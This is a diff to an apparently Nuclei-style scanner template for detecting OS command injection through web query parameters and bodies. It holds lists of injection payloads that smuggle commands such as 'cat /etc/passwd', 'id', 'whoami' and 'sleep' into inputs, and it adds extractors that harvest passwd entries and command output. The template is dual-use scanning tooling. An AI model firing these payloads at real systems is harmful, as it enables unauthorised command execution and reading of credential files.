@@ -18,109 +18,47 @@ info:
 
 variables:
   # Random values for time-based detection
-  sleep_time: "{{rand_int(5, 8)}}"
+  sleep_time: 5
   # Unique marker for output detection
   marker: "{{rand_text_alpha(8)}}"
 
 http:
+  # Output-based detection requests
   - pre-condition:
       - type: dsl
         dsl:
           - 'method == "GET"'
-        condition: or
 
     payloads:
-      # Time-based command injection payloads
-      time_payloads:
-        - "; sleep {{sleep_time}} #"
-        - "| sleep {{sleep_time}} #"
-        - "& sleep {{sleep_time}} #"
-        - "&& sleep {{sleep_time}} #"
-        - "|| sleep {{sleep_time}} #"
-        - "`sleep {{sleep_time}}`"
-        - "$(sleep {{sleep_time}})"
-        - "; ping -c {{sleep_time}} 127.0.0.1 #"
-        - "| ping -c {{sleep_time}} 127.0.0.1 #"
-        - "& ping -c {{sleep_time}} 127.0.0.1 #"
-        - "; timeout {{sleep_time}} #"
-        - "| timeout {{sleep_time}} #"
-        - "& timeout {{sleep_time}} #"
-        - "%3B sleep {{sleep_time}} %23"
-        - "%7C sleep {{sleep_time}} %23"
-        - "%26 sleep {{sleep_time}} %23"
-        - "%0A sleep {{sleep_time}} %0A"
-        - "%0D sleep {{sleep_time}} %0D"
-
       # Output-based command injection payloads
       output_payloads:
-        - "; echo {{marker}} #"
-        - "| echo {{marker}} #"
-        - "& echo {{marker}} #"
-        - "&& echo {{marker}} #"
-        - "|| echo {{marker}} #"
+        - "; id %23"
+        - "| id %23"
+        - "& id %23"
+        - "; cat /etc/passwd %23"
+        - "| cat /etc/passwd %23"
+        - "& cat /etc/passwd %23"
+        - "; whoami %23"
+        - "| whoami %23"
+        - "& whoami %23"
+        - "; ls -la %23"
+        - "| ls -la %23"
+        - "& ls -la %23"
+        - "; echo {{marker}} %23"
+        - "| echo {{marker}} %23"
+        - "& echo {{marker}} %23"
+        - "&& echo {{marker}} %23"
+        - "|| echo {{marker}} %23"
         - "`echo {{marker}}`"
         - "$(echo {{marker}})"
-        - "; cat /etc/passwd #"
-        - "| cat /etc/passwd #"
-        - "& cat /etc/passwd #"
-        - "; whoami #"
-        - "| whoami #"
-        - "& whoami #"
-        - "; id #"
-        - "| id #"
-        - "& id #"
-        - "; ls -la #"
-        - "| ls -la #"
-        - "& ls -la #"
         - "%3B echo {{marker}} %23"
         - "%7C echo {{marker}} %23"
         - "%26 echo {{marker}} %23"
         - "%0A echo {{marker}} %0A"
         - "%0D echo {{marker}} %0D"
 
-    # Time-based detection requests
     fuzzing:
       - part: query
-        type: postfix
-        mode: single
-        fuzz:
-          - "{{time_payloads}}"
-
-    # Time-based analyzer for verification
-    analyzer:
-      name: time_delay
-      parameters:
-        sleep_duration: "{{sleep_time}}"
-        requests_limit: 4
-        time_correlation_error_range: 0.20
-        time_slope_error_range: 0.35
-
-    stop-at-first-match: true
-
-    matchers-condition: or
-    matchers:
-      # Time-based detection
-      - type: word
-        name: time-based-injection
-        part: analyzer
-        words:
-          - "true"
-
-  # Output-based detection requests
-  - pre-condition:
-      - type: dsl
-        dsl:
-          - 'method == "GET" || method == "POST"'
-        condition: or
-
-    fuzzing:
-      - part: query
-        type: postfix
-        mode: single
-        fuzz:
-          - "{{output_payloads}}"
-
-      - part: body
         type: postfix
         mode: single
         fuzz:
@@ -155,15 +93,15 @@ http:
         name: id-output
         part: body
         regex:
-          - "uid=\\d+\\([^)]+\\)\\s+gid=\\d+\\([^)]+\\)"
+          - 'uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)'
 
       - type: regex
         name: ls-output
         part: body
         regex:
-          - "total \\d+"
-          - "drwx.*\\s+\\d+\\s+"
-          - "-rw.*\\s+\\d+\\s+"
+          - 'total \d+'
+          - 'drwx.*\s+\d+\s+'
+          - '-rw.*\s+\d+\s+'
 
       - type: word
         name: windows-commands
@@ -176,9 +114,140 @@ http:
         condition: or
 
     extractors:
+      # Extract marker injection evidence
       - type: regex
-        name: command-output
+        name: marker-evidence
         part: body
         regex:
-          - '(?s){{marker}}.*'
+          - '(?i).*{{marker}}.*'
         group: 0
+
+      # Extract passwd file contents
+      - type: regex
+        name: passwd-entries
+        part: body
+        regex:
+          - '(root:.*:0:0:.*)'
+          - '(daemon:.*:1:1:.*)'
+          - '(bin:.*:2:2:.*)'
+          - '([a-zA-Z0-9_-]+:[x*!]:[\d]+:[\d]+:[^:]*:[^:]*:[^\r\n]*)'
+        group: 1
+
+      # Extract whoami output
+      - type: regex
+        name: user-identity
+        part: body
+        regex:
+          - '^(root|www-data|apache|nginx|nobody|daemon|[a-zA-Z0-9_-]+)$'
+        group: 1
+
+      # Extract id command output
+      - type: regex
+        name: user-id-info
+        part: body
+        regex:
+          - '(uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)(?:\s+groups=[^)]+\))*)'
+        group: 1
+
+      # Extract ls command output
+      - type: regex
+        name: directory-listing
+        part: body
+        regex:
+          - '(total \d+)'
+          - '((?:d|-)(?:r|-)(?:w|-)(?:x|-)(?:r|-)(?:w|-)(?:x|-)(?:r|-)(?:w|-)(?:x|-)\s+\d+\s+[^\s]+\s+[^\s]+\s+\d+\s+[^\r\n]+)'
+        group: 1
+
+      # Extract Windows command output
+      - type: regex
+        name: windows-output
+        part: body
+        regex:
+          - '(Volume in drive [^\r\n]+)'
+          - '(Directory of [^\r\n]+)'
+          - '(Windows IP Configuration[^\r\n]*)'
+          - '(Microsoft Windows [^\r\n]+)'
+        group: 1
+
+      # Extract full command output context
+      - type: regex
+        name: full-command-output
+        part: body
+        regex:
+          - '(?s)({{marker}}.*?)(?:\n\n|\r\n\r\n|$)'
+          - '(?s)(root:.*:0:0:.*?)(?:\n\n|\r\n\r\n|$)'
+          - '(?s)(uid=\d+.*?)(?:\n\n|\r\n\r\n|$)'
+          - '(?s)(total \d+.*?)(?:\n\n|\r\n\r\n|$)'
+        group: 1
+
+      # Extract the injected payload that worked
+      - type: kval
+        name: successful-payload
+        kval:
+          - "payload"
+
+      # Extract all unique command outputs
+      - type: regex
+        name: all-command-evidence
+        part: body
+        regex:
+          - '(?i)((?:root|daemon|bin):[^:]*:[^:]*:[^:]*:[^:]*:[^:]*:[^\r\n]*)'
+          - '(uid=\d+\([^)]+\)(?:\s+gid=\d+\([^)]+\))*(?:\s+groups=[^)]+\))*)'
+          - '((?:total \d+|drwx|d-wx|-rw)[^\r\n]*)'
+          - '(Volume in drive [A-Z]|Directory of [^\r\n]+|Windows IP Configuration)'
+          - '({{marker}}[^\r\n]*)'
+
+  # Time-based detection requests
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      # Time-based command injection payloads
+      time_payloads:
+        - "; sleep [SLEEPTIME] %23"
+        - "| sleep [SLEEPTIME] %23"
+        - "& sleep [SLEEPTIME] %23"
+        - "&& sleep [SLEEPTIME] %23"
+        - "|| sleep [SLEEPTIME] %23"
+        - "`sleep [SLEEPTIME]`"
+        - "$(sleep [SLEEPTIME])"
+        - "; ping -c [SLEEPTIME] 127.0.0.1 %23"
+        - "| ping -c [SLEEPTIME] 127.0.0.1 %23"
+        - "& ping -c [SLEEPTIME] 127.0.0.1 %23"
+        - "; timeout [SLEEPTIME] %23"
+        - "| timeout [SLEEPTIME] %23"
+        - "& timeout [SLEEPTIME] %23"
+        - "%3B sleep [SLEEPTIME] %23"
+        - "%7C sleep [SLEEPTIME] %23"
+        - "%26 sleep [SLEEPTIME] %23"
+        - "%0A sleep [SLEEPTIME] %0A"
+        - "%0D sleep [SLEEPTIME] %0D"
+
+    # Time-based detection requests
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{time_payloads}}"
+
+    # Time-based analyzer for verification
+    analyzer:
+      name: time_delay
+      parameters:
+        sleep_duration: 5
+        requests_limit: 4
+        time_correlation_error_range: 0.20
+        time_slope_error_range: 0.35
+
+    stop-at-first-match: true
+
+    matchers:
+      # Time-based detection
+      - type: word
+        name: time-based-injection
+        part: analyzer
+        words:
+          - "true"
